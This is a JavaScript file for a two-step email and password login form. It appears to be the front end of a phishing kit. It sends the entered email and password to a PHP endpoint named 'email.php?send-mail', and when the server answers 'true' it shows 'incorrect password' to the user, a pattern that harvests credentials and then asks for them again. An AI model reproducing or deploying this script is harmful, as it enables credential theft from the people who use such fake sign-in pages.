var btnNext = document.getElementById("next");
btnNext.addEventListener('click', function(){
	var email = document.getElementById("email");
	var error = document.querySelectorAll("#error");
	if(email.value === "") {
		error[0].textContent = "We didn't recognize this email";
		email.style.borderColor = "red";
		email.focus();
		return false;
	} else {
		var emailDiv = document.getElementById('emailDiv');
		var passwordDiv = document.getElementById("passwordDiv");
		var btnLogin = document.getElementById("login");

		emailDiv.style.transition = "2s";
		emailDiv.style.display = "none";
		passwordDiv.style.transition = "2s";
		passwordDiv.style.display = "block";

		btnLogin.addEventListener('click', function(){
			var password = document.getElementById("password");
			if(password.value === ""){
				error[1].textContent = "Please enter your password";
				password.style.borderColor = "red";
				password.focus();
				return false;
			} else {
				var processing = document.getElementById("processing");
				error[1].textContent = "";
				processing.textContent = "Signing In...";

				var xmlhttp;
			    if(window.XMLHttpRequest){
			      xmlhttp = new XMLHttpRequest();
			    }else{
			      xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
			    }

			    xmlhttp.onreadystatechange=function(){
			      if(xmlhttp.readyState==4 && xmlhttp.status==200){
			      	console.log(xmlhttp.responseText);
			      	var res = xmlhttp.responseText.replace(/\s+/g, "");
			      	if(xmlhttp.responseText === 'true'){
			      		error[1].textContent = "Couldn't sign you in.";
			      		processing.textContent = "incorrect password";
			      	}else {
			      		error[1].textContent = xmlhttp.responseText;
						password.style.borderColor = "red";
			      		processing.textContent = "Sign in";
			      	}
			      }
			    }

		    	var formdata = new FormData();

		    	formdata.append("email", email.value);
		    	formdata.append("password", password.value);

			    var url = 'email.php?send-mail';
			    
			    xmlhttp.open("POST", url);
			    xmlhttp.send(formdata);

			    return true;
			}
		})
	}
})